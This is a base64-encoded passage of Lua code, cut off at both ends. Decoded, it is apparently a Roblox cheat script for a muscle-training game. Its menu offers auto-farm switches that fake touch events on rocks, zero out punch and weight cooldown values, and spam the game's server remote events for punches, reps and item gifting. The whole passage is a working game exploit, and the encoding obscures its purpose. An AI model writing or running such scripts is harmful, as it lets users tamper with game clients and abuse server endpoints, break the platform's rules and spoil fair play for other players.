aW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkxlZnRIYW5kLCAxKQogICAgICAgICAgICAgICAgICAgICAgICBnZXR0b29sKCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZCkKZW5kKQoKYXV0b1JvY2tUYWI6QWRkU3dpdGNoKCJBdXRvIFB1bmNoIE11c2NsZSBLaW5nIFJvY2sgKDVNKSIsIGZ1bmN0aW9uKFZhbHVlKQogICAgc2VsZWN0cm9jayA9ICJNdXNjbGUgS2luZyBHeW0gUm9jayIKICAgIGdldGdlbnYoKS5hdXRvRmFybSA9IFZhbHVlCiAgICAKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIGdldGdlbnYoKS5hdXRvRmFybSBkbwogICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICBpZiBub3QgZ2V0Z2VudigpLmF1dG9GYXJtIHRoZW4gYnJlYWsgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5EdXJhYmlsaXR5LlZhbHVlID49IDUwMDAwMDAgdGhlbgogICAgICAgICAgICAgICAgZm9yIGksIHYgaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKS5tYWNoaW5lc0ZvbGRlcjpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIHYuTmFtZSA9PSAibmVlZGVkRHVyYWJpbGl0eSIgYW5kIHYuVmFsdWUgPT0gNTAwMDAwMCBhbmQgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiTGVmdEhhbmQiKSBhbmQgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUmlnaHRIYW5kIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuUmlnaHRIYW5kLCAwKQogICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuUmlnaHRIYW5kLCAxKQogICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuTGVmdEhhbmQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5MZWZ0SGFuZCwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgZ2V0dG9vbCgpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZCkKCmF1dG9Sb2NrVGFiOkFkZFN3aXRjaCgiQXV0byBQdW5jaCBKdW5nbGUgUm9jayAoMTBNKSIsIGZ1bmN0aW9uKFZhbHVlKQogICAgc2VsZWN0cm9jayA9ICJBbmNpZW50IEp1bmdsZSBSb2NrIgogICAgZ2V0Z2VudigpLmF1dG9GYXJtID0gVmFsdWUKICAgIAogICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgd2hpbGUgZ2V0Z2VudigpLmF1dG9GYXJtIGRvCiAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgIGlmIG5vdCBnZXRnZW52KCkuYXV0b0Zhcm0gdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkR1cmFiaWxpdHkuVmFsdWUgPj0gMTAwMDAwMDAgdGhlbgogICAgICAgICAgICAgICAgZm9yIGksIHYgaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKS5tYWNoaW5lc0ZvbGRlcjpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIHYuTmFtZSA9PSAibmVlZGVkRHVyYWJpbGl0eSIgYW5kIHYuVmFsdWUgPT0gMTAwMDAwMDAgYW5kIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkxlZnRIYW5kIikgYW5kIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlJpZ2h0SGFuZCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLlJpZ2h0SGFuZCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLlJpZ2h0SGFuZCwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkxlZnRIYW5kLCAwKQogICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuTGVmdEhhbmQsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgIGdldHRvb2woKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kKQplbmQpCgpsb2NhbCBHaWZ0ID0gd2luZG93OkFkZFRhYigiR2lmdCIpCkdpZnQ6QWRkTGFiZWwoIkdpZnRpbmcgUHJvdGVpbiBlZ2c6IikuVGV4dFNpemUgPSAyMgoKbG9jYWwgcHJvdGVpbkVnZ0xhYmVsID0gR2lmdDpBZGRMYWJlbCgiUHJvdGVpbiBFZ2dzOiAwIikKcHJvdGVpbkVnZ0xhYmVsLlRleHRTaXplID0gMjAKCmxvY2FsIHNlbGVjdGVkRWdnUGxheWVyID0gbmlsCmxvY2FsIGVnZ0NvdW50ID0gMAoKbG9jYWwgZWdnRHJvcGRvd24gPSBHaWZ0OkFkZERyb3Bkb3duKCJQbGF5ZXIgdG8gR2lmdCBFZ2dzIiwgZnVuY3Rpb24oc2VsZWN0ZWREaXNwbGF5TmFtZSkKICAgIGZvciBfLCBwbHIgaW4gaXBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgICAgIGlmIHBsci5EaXNwbGF5TmFtZSA9PSBzZWxlY3RlZERpc3BsYXlOYW1lIHRoZW4KICAgICAgICAgICAgc2VsZWN0ZWRFZ2dQbGF5ZXIgPSBwbHIKICAgICAgICAgICAgYnJlYWsKICAgICAgICBlbmQKICAgIGVuZAplbmQpCgpmb3IgXywgcGxyIGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgIGlmIHBsciB+PSBQbGF5ZXJzLkxvY2FsUGxheWVyIHRoZW4KICAgICAgICBlZ2dEcm9wZG93bjpBZGQocGxyLkRpc3BsYXlOYW1lKQogICAgZW5kCmVuZAoKUGxheWVycy5QbGF5ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHBscikKICAgIGlmIHBsciB+PSBQbGF5ZXJzLkxvY2FsUGxheWVyIHRoZW4KICAgICAgICBlZ2dEcm9wZG93bjpBZGQocGxyLkRpc3BsYXlOYW1lKQogICAgZW5kCmVuZCkKCkdpZnQ6QWRkVGV4dEJveCgiQW1vdW50IG9mIEVnZ3MiLCBmdW5jdGlvbih0ZXh0KQogICAgZWdnQ291bnQgPSB0b251bWJlcih0ZXh0KSBvciAwCmVuZCkKCkdpZnQ6QWRkQnV0dG9uKCJHaWZ0IEVnZ3MiLCBmdW5jdGlvbigpCiAgICBpZiBzZWxlY3RlZEVnZ1BsYXllciBhbmQgZWdnQ291bnQgPiAwIHRoZW4KICAgICAgICBmb3IgaSA9IDEsIGVnZ0NvdW50IGRvCiAgICAgICAgICAgIGxvY2FsIGVnZyA9IFBsYXllcnMuTG9jYWxQbGF5ZXIuY29uc3VtYWJsZXNGb2xkZXI6RmluZEZpcnN0Q2hpbGQoIlByb3RlaW4gRWdnIikKICAgICAgICAgICAgaWYgZWdnIHRoZW4KICAgICAgICAgICAgICAgIFJlcGxpY2F0ZWRTdG9yYWdlLnJFdmVudHMuZ2lmdFJlbW90ZTpJbnZva2VTZXJ2ZXIoImdpZnRSZXF1ZXN0Iiwgc2VsZWN0ZWRFZ2dQbGF5ZXIsIGVnZykKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCmVuZCkKCkdpZnQ6QWRkTGFiZWwoIkdpZnRpbmcgVHJvcGljYWwgU2hha2VzOiIpLlRleHRTaXplID0gMjIKCmxvY2FsIHRyb3BpY2FsU2hha2VMYWJlbCA9IEdpZnQ6QWRkTGFiZWwoIlRyb3BpY2FsIFNoYWtlczogMCIpCnRyb3BpY2FsU2hha2VMYWJlbC5UZXh0U2l6ZSA9IDE4Cgpsb2NhbCBzZWxlY3RlZFNoYWtlUGxheWVyID0gbmlsCmxvY2FsIHNoYWtlQ291bnQgPSAwCgpsb2NhbCBzaGFrZURyb3Bkb3duID0gR2lmdDpBZGREcm9wZG93bigiUGxheWVyIHRvIEdpZnQgVHJvcGljYWwgU2hha2VzIiwgZnVuY3Rpb24oc2VsZWN0ZWREaXNwbGF5TmFtZSkKICAgIGZvciBfLCBwbHIgaW4gaXBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgICAgIGlmIHBsci5EaXNwbGF5TmFtZSA9PSBzZWxlY3RlZERpc3BsYXlOYW1lIHRoZW4KICAgICAgICAgICAgc2VsZWN0ZWRTaGFrZVBsYXllciA9IHBscgogICAgICAgICAgICBicmVhawogICAgICAgIGVuZAogICAgZW5kCmVuZCkKCmZvciBfLCBwbHIgaW4gaXBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgaWYgcGxyIH49IFBsYXllcnMuTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgIHNoYWtlRHJvcGRvd246QWRkKHBsci5EaXNwbGF5TmFtZSkKICAgIGVuZAplbmQKClBsYXllcnMuUGxheWVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihwbHIpCiAgICBpZiBwbHIgfj0gUGxheWVycy5Mb2NhbFBsYXllciB0aGVuCiAgICAgICAgc2hha2VEcm9wZG93bjpBZGQocGxyLkRpc3BsYXlOYW1lKQogICAgZW5kCmVuZCkKCkdpZnQ6QWRkVGV4dEJveCgiVHJvcGljYWwgU2hha2VzIGdpZnQiLCBmdW5jdGlvbih0ZXh0KQogICAgc2hha2VDb3VudCA9IHRvbnVtYmVyKHRleHQpIG9yIDAKZW5kKQoKR2lmdDpBZGRCdXR0b24oIkdpZnQgVHJvcGljYWwgU2hha2VzIiwgZnVuY3Rpb24oKQogICAgaWYgc2VsZWN0ZWRTaGFrZVBsYXllciBhbmQgc2hha2VDb3VudCA+IDAgdGhlbgogICAgICAgIGZvciBpID0gMSwgc2hha2VDb3VudCBkbwogICAgICAgICAgICBsb2NhbCBzaGFrZSA9IFBsYXllcnMuTG9jYWxQbGF5ZXIuY29uc3VtYWJsZXNGb2xkZXI6RmluZEZpcnN0Q2hpbGQoIlRyb3BpY2FsIFNoYWtlIikKICAgICAgICAgICAgaWYgc2hha2UgdGhlbgogICAgICAgICAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2UuckV2ZW50cy5naWZ0UmVtb3RlOkludm9rZVNlcnZlcigiZ2lmdFJlcXVlc3QiLCBzZWxlY3RlZFNoYWtlUGxheWVyLCBzaGFrZSkKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCmVuZCkKCmxvY2FsIGZ1bmN0aW9uIHVwZGF0ZUl0ZW1Db3VudCgpCiAgICBsb2NhbCBwcm90ZWluRWdnQ291bnQgPSAwCiAgICBsb2NhbCB0cm9waWNhbFNoYWtlQ291bnQgPSAwCgogICAgbG9jYWwgYmFja3BhY2sgPSBQbGF5ZXJzLkxvY2FsUGxheWVyOldhaXRGb3JDaGlsZCgiQmFja3BhY2siKQogICAgaWYgYmFja3BhY2sgdGhlbgogICAgICAgIGZvciBfLCBpdGVtIGluIGlwYWlycyhiYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBpZiBpdGVtLk5hbWUgPT0gIlByb3RlaW4gRWdnIiB0aGVuCiAgICAgICAgICAgICAgICBwcm90ZWluRWdnQ291bnQgPSBwcm90ZWluRWdnQ291bnQgKyAxCiAgICAgICAgICAgIGVsc2VpZiBpdGVtLk5hbWUgPT0gIlRyb3BpY2FsIFNoYWtlIiBvciBpdGVtLk5hbWUgPT0gIlBpw7FhcyIgdGhlbgogICAgICAgICAgICAgICAgdHJvcGljYWxTaGFrZUNvdW50ID0gdHJvcGljYWxTaGFrZUNvdW50ICsgMQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAoKICAgIHByb3RlaW5FZ2dMYWJlbC5UZXh0ID0gIlByb3RlaW4gRWdnczogIiAuLiBwcm90ZWluRWdnQ291bnQKICAgIHRyb3BpY2FsU2hha2VMYWJlbC5UZXh0ID0gIlRyb3BpY2FsIFNoYWtlczogIiAuLiB0cm9waWNhbFNoYWtlQ291bnQKZW5kCgp0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgIHdoaWxlIHRydWUgZG8KICAgICAgICB1cGRhdGVJdGVtQ291bnQoKQogICAgICAgIHRhc2sud2FpdCgwLjI1KQogICAgZW5kCmVuZCkKCmxvY2FsIG1pc2NUYWIgPSB3aW5kb3c6QWRkVGFiKCJNaXNjIikKCmxvY2FsIG1pc2MxRm9sZGVyID0gbWlzY1RhYjpBZGRGb2xkZXIoIk1pc2MgMSIpCgotLSBGYXN0IFB1bmNoIHRvZ2dsZSB3aXRoIGF1dG8tcHVuY2ggZnVuY3Rpb25hbGl0eSBhbmQgcGVyc2lzdGVudCBlcXVpcHBpbmcKbWlzYzFGb2xkZXI6QWRkU3dpdGNoKCJBdXRvIFB1bmNoIiwgZnVuY3Rpb24oYm9vbCkKICAgIF9HLkZhc3RQdW5jaCA9IGJvb2wKICAgIAogICAgaWYgYm9vbCB0aGVuCiAgICAgICAgLS0gRnVuY3Rpb24gdG8gY29udGludW91c2x5IGVxdWlwIGFuZCBtb2RpZnkgcHVuY2gKICAgICAgICBzcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIF9HLkZhc3RQdW5jaCBkbwogICAgICAgICAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC0tIENoZWNrIGlmIHRvb2wgaXMgbm90IGVxdWlwcGVkCiAgICAgICAgICAgICAgICBpZiBjaGFyYWN0ZXIgYW5kIG5vdCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHB1bmNoID0gcGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpCiAgICAgICAgICAgICAgICAgICAgaWYgcHVuY2ggdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBpZiBwdW5jaDpGaW5kRmlyc3RDaGlsZCgiYXR0YWNrVGltZSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB1bmNoLmF0dGFja1RpbWUuVmFsdWUgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBjaGFyYWN0ZXIuSHVtYW5vaWQ6RXF1aXBUb29sKHB1bmNoKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZWxzZWlmIGNoYXJhY3RlciBhbmQgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAtLSBNYWtlIHN1cmUgZXF1aXBwZWQgdG9vbCBpcyBtb2RpZmllZAogICAgICAgICAgICAgICAgICAgIGxvY2FsIGVxdWlwcGVkID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpCiAgICAgICAgICAgICAgICAgICAgaWYgZXF1aXBwZWQ6RmluZEZpcnN0Q2hpbGQoImF0dGFja1RpbWUiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGVxdWlwcGVkLmF0dGFja1RpbWUuVmFsdWUgPSAwCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgd2FpdCgwLjEpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgICAgICAKICAgICAgICAtLSBGdW5jdGlvbiB0byByYXBpZGx5IHB1bmNoCiAgICAgICAgc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICB3aGlsZSBfRy5GYXN0UHVuY2ggZG8KICAgICAgICAgICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgICAgICAgICAgcGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInB1bmNoIiwgInJpZ2h0SGFuZCIpCiAgICAgICAgICAgICAgICBwbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicHVuY2giLCAibGVmdEhhbmQiKQogICAgICAgICAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgaWYgY2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBwdW5jaFRvb2wgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikKICAgICAgICAgICAgICAgICAgICBpZiBwdW5jaFRvb2wgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBwdW5jaFRvb2w6QWN0aXZhdGUoKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICB3YWl0KDApCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVsc2UKICAgICAgICAtLSBVbmVxdWlwIGFuZCByZXNldCB0b29sCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIGxvY2FsIGVxdWlwcGVkID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpCiAgICAgICAgaWYgZXF1aXBwZWQgdGhlbgogICAgICAgICAgICBpZiBlcXVpcHBlZDpGaW5kRmlyc3RDaGlsZCgiYXR0YWNrVGltZSIpIHRoZW4KICAgICAgICAgICAgICAgIGVxdWlwcGVkLmF0dGFja1RpbWUuVmFsdWUgPSAwLjM1CiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlcXVpcHBlZC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAtLSBBbHNvIHJlc2V0IHRoZSBiYWNrcGFjayB0b29sCiAgICAgICAgbG9jYWwgYmFja3BhY2tUb29sID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpCiAgICAgICAgaWYgYmFja3BhY2tUb29sIGFuZCBiYWNrcGFja1Rvb2w6RmluZEZpcnN0Q2hpbGQoImF0dGFja1RpbWUiKSB0aGVuCiAgICAgICAgICAgIGJhY2twYWNrVG9vbC5hdHRhY2tUaW1lLlZhbHVlID0gMC4zNQogICAgICAgIGVuZAogICAgZW5kCmVuZCkKCi0tIEZhc3QgV2VpZ2h0IHRvZ2dsZSB3aXRoIGF1dG8td2VpZ2h0IGZ1bmN0aW9uYWxpdHkgYW5kIHBlcnNpc3RlbnQgZXF1aXBwaW5nCm1pc2MxRm9sZGVyOkFkZFN3aXRjaCgiQXV0byBXZWlnaHQiLCBmdW5jdGlvbihib29sKQogICAgX0cuRmFzdFdlaWdodCA9IGJvb2wKICAgIAogICAgaWYgYm9vbCB0aGVuCiAgICAgICAgLS0gQ29udGludW91c2x5IGVxdWlwIGFuZCBtb2RpZnkgd2VpZ2h0IHRvb2wKICAgICAgICBzcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIF9HLkZhc3RXZWlnaHQgZG8KICAgICAgICAgICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgICAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAtLSBDaGVjayBpZiB0b29sIGlzIG5vdCBlcXVpcHBlZAogICAgICAgICAgICAgICAgaWYgY2hhcmFjdGVyIGFuZCBub3QgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJXZWlnaHQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgd2VpZ2h0VG9vbCA9IHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiV2VpZ2h0IikKICAgICAgICAgICAgICAgICAgICBpZiB3ZWlnaHRUb29sIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgaWYgd2VpZ2h0VG9vbDpGaW5kRmlyc3RDaGlsZCgicmVwVGltZSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdlaWdodFRvb2wucmVwVGltZS5WYWx1ZSA9IDAKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGNoYXJhY3Rlci5IdW1hbm9pZDpFcXVpcFRvb2wod2VpZ2h0VG9vbCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVsc2VpZiBjaGFyYWN0ZXIgYW5kIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiV2VpZ2h0IikgdGhlbgogICAgICAgICAgICAgICAgICAgIC0tIE1ha2Ugc3VyZSBlcXVpcHBlZCB0b29sIGlzIG1vZGlmaWVkCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgZXF1aXBwZWQgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIldlaWdodCIpCiAgICAgICAgICAgICAgICAgICAgaWYgZXF1aXBwZWQ6RmluZEZpcnN0Q2hpbGQoInJlcFRpbWUiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGVxdWlwcGVkLnJlcFRpbWUuVmFsdWUgPSAwCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgd2FpdCgwLjEpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgICAgICAKICAgICAgICAtLSBBdXRvIGRvIHdlaWdodCBsaWZ0aW5nCiAgICAgICAgc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICB3aGlsZSBfRy5GYXN0V2VpZ2h0IGRvCiAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJyZXAiKQogICAgICAgICAgICAgICAgdGFzay53YWl0KDApCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVsc2UKICAgICAgICAtLSBVbmVxdWlwIGFuZCByZXNldCB0b29sCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIGxvY2FsIGVxdWlwcGVkID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJXZWlnaHQiKQogICAgICAgIGlmIGVxdWlwcGVkIHRoZW4KICAgICAgICAgICAgaWYgZXF1aXBwZWQ6RmluZEZpcnN0Q2hpbGQoInJlcFRpbWUiKSB0aGVuCiAgICAgICAgICAgICAgICBlcXVpcHBlZC5yZXBUaW1lLlZhbHVlID0gMQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgZXF1aXBwZWQuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgLS0gQWxzbyByZXNldCB0aGUgYmFja3BhY2sgdG9vbAogICAgICAgIGxvY2FsIGJhY2twYWNrVG9vbCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiV2VpZ2h0IikKICAgICAgICBpZiBiYWNrcGFja1Rvb2wgYW5kIGJhY2twYWNrVG9vbDpGaW5kRmlyc3RDaGlsZCgicmVwVGltZSIpIHRoZW4KICAgICAgICAgICAgYmFja3BhY2tUb29sLnJlcFRpbWUuVmFsdWUgPSAxCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKLS0gRmFzdCBQdXNodXBzIHRvZ2dsZSB3aXRoIGF1dG8tcHVzaHVwcyBmdW5jdGlvbmFsaXR5IGFuZCBwZXJzaXN0ZW50IGVxdWlwcGluZwptaXNjMUZvbGRlcjpBZGRTd2l0Y2goIkF1dG8gUHVzaHVwcyIsIGZ1bmN0aW9uKGJvb2wpCiAgICBfRy5GYXN0UHVzaHVwcyA9IGJvb2wKICAgIAogICAgaWYgYm9vbCB0aGVuCiAgICAgICAgLS0gQ29udGludW91c2x5IGVxdWlwIGFuZCBtb2RpZnkgcHVzaHVwcyB0b29sCiAgICAgICAgc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICB3aGlsZSBfRy5GYXN0UHVzaHVwcyBkbwogICAgICAgICAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC0tIENoZWNrIGlmIHRvb2wgaXMgbm90IGVxdWlwcGVkCiAgICAgICAgICAgICAgICBpZiBjaGFyYWN0ZXIgYW5kIG5vdCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlB1c2h1cHMiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgcHVzaHVwc1Rvb2wgPSBwbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlB1c2h1cHMiKQogICAgICAgICAgICAgICAgICAgIGlmIHB1c2h1cHNUb29sIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgaWYgcHVzaHVwc1Rvb2w6RmluZEZpcnN0Q2hpbGQoInJlcFRpbWUiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwdXNodXBzVG9vbC5yZXBUaW1lLlZhbHVlID0gMAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgY2hhcmFjdGVyLkh1bWFub2lkOkVxdWlwVG9vbChwdXNodXBzVG9vbCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVsc2VpZiBjaGFyYWN0ZXIgYW5kIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUHVzaHVwcyIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAtLSBNYWtlIHN1cmUgZXF1aXBwZWQgdG9vbCBpcyBtb2RpZmllZAogICAgICAgICAgICAgICAgICAgIGxvY2FsIGVxdWlwcGVkID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJQdXNo